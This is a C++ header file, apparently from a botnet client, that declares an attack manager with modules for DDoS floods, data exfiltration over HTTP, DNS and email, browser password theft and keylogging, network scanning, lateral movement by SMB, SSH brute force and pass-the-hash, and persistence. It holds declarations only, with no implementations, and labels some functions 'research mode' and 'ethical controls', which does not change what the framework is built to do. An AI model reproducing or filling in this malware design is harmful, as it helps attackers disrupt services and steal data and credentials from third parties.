#pragma once

#include <memory>
#include <string>
#include <vector>
#include <map>
#include <functional>
#include <atomic>
#include <mutex>
#include <thread>
#include <chrono>
#include <nlohmann/json.hpp>
#include "../../../common/utils/platform_utils.h"
#include "../../../common/protocol/message.h"

namespace botnet {
namespace client {
namespace attacks {

/**
 * @brief Attack manager for coordinating offensive operations - single codebase
 * 
 * Manages all attack modules with configurable ethical controls.
 * Works identically on Windows, Linux, and macOS.
 */
class AttackManager {
public:
    enum class AttackType {
        DDOS_HTTP_FLOOD,
        DDOS_SYN_FLOOD,
        DDOS_UDP_FLOOD,
        DDOS_ICMP_FLOOD,
        DATA_EXFILTRATION,
        CREDENTIAL_HARVEST,
        KEYLOGGING,
        NETWORK_SCAN,
        PORT_SCAN,
        LATERAL_MOVEMENT,
        PRIVILEGE_ESCALATION,
        PERSISTENCE_INSTALL,
        RANSOMWARE_SIMULATION,  // Research/educational only
        RESEARCH_DATA_COLLECTION
    };

    enum class AttackStatus {
        IDLE,
        PREPARING,
        RUNNING,
        PAUSED,
        COMPLETED,
        FAILED,
        STOPPED,
        BLOCKED_BY_ETHICS
    };

    struct AttackConfig {
        AttackType type;
        nlohmann::json parameters;
        std::chrono::seconds duration;
        std::chrono::seconds delay_between_attempts;
        uint32_t max_attempts;
        bool research_mode;
        std::string research_session_id;
        bool require_ethical_approval;
        std::vector<std::string> target_restrictions;
        uint32_t rate_limit_per_second;
        bool enable_logging;
    };

    struct AttackResult {
        AttackType type;
        AttackStatus status;
        std::chrono::system_clock::time_point started_at;
        std::chrono::system_clock::time_point completed_at;
        uint32_t attempts_made;
        uint32_t successful_attempts;
        uint64_t bytes_transferred;
        nlohmann::json result_data;
        std::string error_message;
        std::vector<std::string> logs;
        bool ethical_compliance_verified;
    };

public:
    AttackManager();
    ~AttackManager();

    // Core operations
    bool Initialize(bool research_mode = true);
    bool StartAttack(const AttackConfig& config);
    bool StopAttack(AttackType type);
    bool PauseAttack(AttackType type);
    bool ResumeAttack(AttackType type);
    void StopAllAttacks();

    // Status and monitoring
    AttackStatus GetAttackStatus(AttackType type) const;
    AttackResult GetAttackResult(AttackType type) const;
    std::vector<AttackType> GetActiveAttacks() const;
    std::map<AttackType, AttackResult> GetAllResults() const;

    // Configuration
    bool IsAttackSupported(AttackType type) const;
    std::vector<AttackType> GetSupportedAttacks() const;
    bool IsAttackEthicallyApproved(AttackType type) const;
    bool ValidateAttackConfig(const AttackConfig& config) const;

    // Research mode controls
    void EnableResearchMode(const std::string& session_id);
    void DisableResearchMode();
    bool IsResearchModeEnabled() const;
    void SetEthicalConstraints(const std::vector<std::string>& constraints);
    std::vector<std::string> GetResearchLogs() const;

    // Emergency controls
    void TriggerEmergencyStop(const std::string& reason);
    bool IsEmergencyStopTriggered() const;

private:
    // Forward declarations for attack modules
    class DDoSModule;
    class DataExfiltrationModule;
    class CredentialHarvestModule;
    class NetworkScanModule;
    class LateralMovementModule;
    class ResearchModule;

    bool research_mode_;
    std::string research_session_id_;
    std::vector<std::string> ethical_constraints_;
    
    // Attack modules
    std::unique_ptr<DDoSModule> ddos_module_;
    std::unique_ptr<DataExfiltrationModule> data_exfil_module_;
    std::unique_ptr<CredentialHarvestModule> credential_module_;
    std::unique_ptr<NetworkScanModule> network_scan_module_;
    std::unique_ptr<LateralMovementModule> lateral_movement_module_;
    std::unique_ptr<ResearchModule> research_module_;

    // Attack tracking
    std::map<AttackType, AttackResult> attack_results_;
    std::map<AttackType, std::unique_ptr<std::thread>> attack_threads_;
    mutable std::mutex attacks_mutex_;

    // Emergency controls
    std::atomic<bool> emergency_stop_triggered_;
    std::string emergency_stop_reason_;

    // Research logging
    mutable std::vector<std::string> research_logs_;
    mutable std::mutex logs_mutex_;

    // Internal methods
    bool InitializeModules();
    void ExecuteAttack(const AttackConfig& config);
    bool ValidateEthicalConstraints(const AttackConfig& config) const;
    void LogAttackActivity(const std::string& activity);
    void UpdateAttackResult(AttackType type, const AttackResult& result);
};

/**
 * @brief DDoS attack module with multiple vectors
 */
class AttackManager::DDoSModule {
public:
    enum class DDoSVector {
        HTTP_FLOOD,
        HTTPS_FLOOD,
        SYN_FLOOD,
        UDP_FLOOD,
        ICMP_FLOOD,
        DNS_AMPLIFICATION,
        SLOWLORIS,
        POST_FLOOD
    };

    struct DDoSConfig {
        DDoSVector vector;
        std::string target_host;
        uint16_t target_port;
        uint32_t threads;
        uint32_t requests_per_second;
        std::chrono::seconds duration;
        std::string user_agent;
        std::map<std::string, std::string> headers;
        std::string payload;
        bool randomize_source;
        std::vector<std::string> proxy_list;
    };

public:
    DDoSModule();
    ~DDoSModule();

    bool Initialize();
    AttackResult ExecuteHTTPFlood(const DDoSConfig& config);
    AttackResult ExecuteSYNFlood(const DDoSConfig& config);
    AttackResult ExecuteUDPFlood(const DDoSConfig& config);
    AttackResult ExecuteICMPFlood(const DDoSConfig& config);
    AttackResult ExecuteSlowloris(const DDoSConfig& config);

    // Research mode DDoS (limited scale)
    AttackResult ExecuteResearchDDoS(const DDoSConfig& config);

private:
    std::atomic<bool> attack_running_;
    std::vector<std::unique_ptr<std::thread>> worker_threads_;

    // HTTP flood implementations
    void HTTPFloodWorker(const DDoSConfig& config, std::atomic<uint32_t>& requests_sent);
    void SYNFloodWorker(const DDoSConfig& config, std::atomic<uint32_t>& packets_sent);
    void UDPFloodWorker(const DDoSConfig& config, std::atomic<uint32_t>& packets_sent);

    // Cross-platform raw socket implementations
    bool CreateRawSocket(int& socket_fd);
    bool SendSYNPacket(int socket_fd, const std::string& target, uint16_t port);
    bool SendUDPPacket(int socket_fd, const std::string& target, uint16_t port, const std::string& payload);

    // Traffic shaping and rate limiting
    void ApplyRateLimit(uint32_t max_rate, std::atomic<uint32_t>& current_rate);
    std::chrono::milliseconds CalculateDelay(uint32_t target_rate);

    // Research mode limitations
    bool ValidateResearchTarget(const std::string& target) const;
    DDoSConfig ApplyResearchLimitations(const DDoSConfig& config) const;
};

/**
 * @brief Data exfiltration module for collecting and transmitting data
 */
class AttackManager::DataExfiltrationModule {
public:
    enum class ExfiltrationMethod {
        HTTP_POST,
        HTTPS_POST,
        DNS_TUNNELING,
        EMAIL_SMTP,
        FTP_UPLOAD,
        STEGANOGRAPHY,
        CLOUD_STORAGE
    };

    struct ExfiltrationConfig {
        ExfiltrationMethod method;
        std::vector<std::string> target_paths;
        std::vector<std::string> file_extensions;
        std::string destination_url;
        uint64_t max_file_size;
        bool encrypt_data;
        std::string encryption_key;
        bool compress_data;
        uint32_t batch_size;
        std::chrono::seconds interval;
    };

public:
    DataExfiltrationModule();
    ~DataExfiltrationModule();

    bool Initialize();
    AttackResult ExecuteDataCollection(const ExfiltrationConfig& config);
    AttackResult ExecuteFileExfiltration(const ExfiltrationConfig& config);

    // Research mode data collection (anonymized)
    AttackResult ExecuteResearchDataCollection(const ExfiltrationConfig& config);

private:
    std::atomic<bool> collection_running_;
    
    // File discovery and collection
    std::vector<std::string> FindTargetFiles(const std::vector<std::string>& paths,
                                            const std::vector<std::string>& extensions);
    bool CollectFileMetadata(const std::string& file_path, nlohmann::json& metadata);
    std::vector<uint8_t> ReadFileContent(const std::string& file_path, uint64_t max_size);

    // Data processing
    std::vector<uint8_t> CompressData(const std::vector<uint8_t>& data);
    std::vector<uint8_t> EncryptData(const std::vector<uint8_t>& data, const std::string& key);
    std::vector<uint8_t> AnonymizeData(const std::vector<uint8_t>& data);

    // Exfiltration methods
    bool ExfiltrateViaHTTP(const std::vector<uint8_t>& data, const std::string& url);
    bool ExfiltrateViaDNS(const std::vector<uint8_t>& data, const std::string& domain);
    bool ExfiltrateViaEmail(const std::vector<uint8_t>& data, const std::string& email);

    // Research mode data anonymization
    nlohmann::json AnonymizeFileMetadata(const nlohmann::json& metadata);
    std::vector<uint8_t> CreateResearchDataset(const std::vector<std::string>& files);
};

/**
 * @brief Credential harvesting module
 */
class AttackManager::CredentialHarvestModule {
public:
    enum class HarvestMethod {
        BROWSER_PASSWORDS,
        KEYLOGGING,
        MEMORY_DUMP,
        REGISTRY_HARVEST,
        NETWORK_SNIFFING,
        CLIPBOARD_MONITORING,
        FORM_GRABBING
    };

    struct HarvestConfig {
        std::vector<HarvestMethod> methods;
        std::chrono::seconds duration;
        std::vector<std::string> target_processes;
        std::vector<std::string> target_domains;
        bool hash_credentials;
        bool encrypt_storage;
        uint32_t max_entries;
        std::string storage_path;
    };

public:
    CredentialHarvestModule();
    ~CredentialHarvestModule();

    bool Initialize();
    AttackResult ExecuteCredentialHarvest(const HarvestConfig& config);

    // Research mode (anonymized credential patterns)
    AttackResult ExecuteResearchCredentialAnalysis(const HarvestConfig& config);

private:
    std::atomic<bool> harvesting_active_;
    std::vector<std::unique_ptr<std::thread>> harvest_threads_;

    // Browser credential extraction
    std::vector<nlohmann::json> ExtractBrowserPasswords();
    std::vector<nlohmann::json> ExtractChromePasswords();
    std::vector<nlohmann::json> ExtractFirefoxPasswords();
    std::vector<nlohmann::json> ExtractEdgePasswords();

    // Keylogging (cross-platform)
    void StartKeylogger(std::chrono::seconds duration);
    void StopKeylogger();
    std::vector<std::string> GetCapturedKeystrokes();

    // Memory analysis
    std::vector<nlohmann::json> ScanProcessMemory(const std::vector<std::string>& processes);
    std::vector<std::string> FindCredentialPatterns(const std::vector<uint8_t>& memory);

    // Registry analysis (Windows)
    std::vector<nlohmann::json> HarvestRegistryCredentials();

    // Network credential sniffing
    void StartNetworkSniffing();
    void StopNetworkSniffing();
    std::vector<nlohmann::json> GetCapturedCredentials();

    // Research mode anonymization
    nlohmann::json AnonymizeCredential(const nlohmann::json& credential);
    std::vector<nlohmann::json> GenerateCredentialPatterns();
};

/**
 * @brief Network reconnaissance and scanning module
 */
class AttackManager::NetworkScanModule {
public:
    enum class ScanType {
        HOST_DISCOVERY,
        PORT_SCAN,
        SERVICE_DETECTION,
        OS_FINGERPRINTING,
        VULNERABILITY_SCAN,
        NETWORK_MAPPING,
        WIRELESS_SCAN
    };

    struct ScanConfig {
        ScanType type;
        std::string target_network;
        std::vector<uint16_t> target_ports;
        uint32_t scan_threads;
        std::chrono::milliseconds timeout;
        bool stealth_mode;
        bool service_detection;
        bool os_detection;
        std::string output_format;
    };

public:
    NetworkScanModule();
    ~NetworkScanModule();

    bool Initialize();
    AttackResult ExecuteNetworkScan(const ScanConfig& config);
    AttackResult ExecutePortScan(const ScanConfig& config);
    AttackResult ExecuteServiceDetection(const ScanConfig& config);

    // Research mode scanning (limited scope)
    AttackResult ExecuteResearchNetworkScan(const ScanConfig& config);

private:
    std::atomic<bool> scan_running_;

    // Host discovery
    std::vector<std::string> DiscoverHosts(const std::string& network);
    bool PingHost(const std::string& host, std::chrono::milliseconds timeout);
    bool ARPScan(const std::string& network, std::vector<std::string>& hosts);

    // Port scanning
    std::map<uint16_t, bool> ScanPorts(const std::string& host, const std::vector<uint16_t>& ports);
    bool ConnectScan(const std::string& host, uint16_t port, std::chrono::milliseconds timeout);
    bool SYNScan(const std::string& host, uint16_t port);

    // Service detection
    std::string DetectService(const std::string& host, uint16_t port);
    std::string GrabBanner(const std::string& host, uint16_t port);

    // OS fingerprinting
    std::string DetectOS(const std::string& host);
    std::string AnalyzeTCPFingerprint(const std::string& host);

    // Research mode limitations
    ScanConfig ApplyResearchLimitations(const ScanConfig& config) const;
    bool IsTargetAllowedForResearch(const std::string& target) const;
};

/**
 * @brief Lateral movement module for network propagation
 */
class AttackManager::LateralMovementModule {
public:
    enum class MovementMethod {
        SMB_EXPLOIT,
        SSH_BRUTEFORCE,
        RDP_EXPLOIT,
        WMI_EXECUTION,
        PSEXEC,
        PASS_THE_HASH,
        KERBEROS_ATTACK,
        VULNERABLE_SERVICE_EXPLOIT
    };

    struct MovementConfig {
        MovementMethod method;
        std::string target_host;
        std::string username;
        std::string password;
        std::string payload_path;
        std::vector<std::string> credential_list;
        bool use_discovered_credentials;
        uint32_t max_attempts;
        std::chrono::seconds attempt_delay;
    };

public:
    LateralMovementModule();
    ~LateralMovementModule();

    bool Initialize();
    AttackResult ExecuteLateralMovement(const MovementConfig& config);

    // Research mode (simulation only)
    AttackResult ExecuteResearchMovementSimulation(const MovementConfig& config);

private:
    // SMB-based movement
    bool AttemptSMBConnection(const std::string& host, const std::string& username, const std::string& password);
    bool ExecuteViaSMB(const std::string& host, const std::string& command);

    // SSH-based movement
    bool AttemptSSHConnection(const std::string& host, const std::string& username, const std::string& password);
    bool ExecuteViaSSH(const std::string& host, const std::string& command);

    // RDP-based movement
    bool AttemptRDPConnection(const std::string& host, const std::string& username, const std::string& password);

    // WMI execution (Windows)
    bool ExecuteViaWMI(const std::string& host, const std::string& command, const std::string& username, const std::string& password);

    // Credential validation
    bool ValidateCredentials(const std::string& host, const std::string& username, const std::string& password);
    std::vector<std::pair<std::string, std::string>> GetValidCredentials(const std::string& host, const std::vector<std::string>& credential_list);

    // Research mode simulation
    AttackResult SimulateMovementAttempt(const MovementConfig& config);
    nlohmann::json GenerateMovementReport(const MovementConfig& config, bool success);
};

/**
 * @brief Research-specific module for educational data collection
 */
class AttackManager::ResearchModule {
public:
    struct ResearchConfig {
        std::string research_session_id;
        std::string research_type;
        std::vector<std::string> data_collection_methods;
        bool anonymize_data;
        bool generate_synthetic_data;
        std::string output_path;
        nlohmann::json research_parameters;
    };

public:
    ResearchModule();
    ~ResearchModule();

    bool Initialize();
    AttackResult ExecuteResearchDataCollection(const ResearchConfig& config);
    AttackResult GenerateSyntheticAttackData(const ResearchConfig& config);
    AttackResult AnalyzeSystemBehavior(const ResearchConfig& config);

private:
    // Synthetic data generation
    nlohmann::json GenerateSyntheticNetworkTraffic();
    nlohmann::json GenerateSyntheticCredentials();
    nlohmann::json GenerateSyntheticSystemLogs();

    // Behavioral analysis
    nlohmann::json AnalyzeNetworkBehavior();
    nlohmann::json AnalyzeSystemPerformance();
    nlohmann::json AnalyzeSecurityEvents();

    // Data anonymization
    nlohmann::json AnonymizeResearchData(const nlohmann::json& data);
    void RemovePersonalIdentifiers(nlohmann::json& data);
};

/**
 * @brief Attack validation and ethical control system
 */
class AttackValidator {
public:
    struct ValidationResult {
        bool allowed;
        std::string reason;
        std::vector<std::string> warnings;
        std::vector<std::string> required_approvals;
        bool requires_research_consent;
    };

public:
    static ValidationResult ValidateAttack(const AttackManager::AttackConfig& config, bool research_mode);
    static bool IsTargetAllowed(const std::string& target, bool research_mode);
    static bool IsAttackTypePermitted(AttackManager::AttackType type, bool research_mode);
    static ValidationResult ValidateResearchAttack(const AttackManager::AttackConfig& config);

private:
    static bool IsPrivateNetwork(const std::string& target);
    static bool IsResearchInstitution(const std::string& target);
    static bool IsBlacklistedTarget(const std::string& target);
    static std::vector<std::string> GetResearchApprovedAttacks();
    static std::vector<std::string> GetBlockedTargets();
};

} // namespace attacks
} // namespace client
} // namespace botnet
